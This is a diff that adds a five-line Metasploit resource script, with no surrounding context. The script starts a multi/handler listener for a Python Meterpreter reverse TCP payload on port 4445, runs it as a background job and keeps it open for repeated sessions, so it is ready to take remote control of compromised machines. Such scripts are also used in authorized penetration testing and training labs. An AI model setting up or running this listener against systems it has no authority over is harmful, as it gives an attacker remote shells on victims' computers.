@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set PAYLOAD python/meterpreter/reverse_tcp
+set ExitOnSession false
+set LPORT 4445
+exploit -j
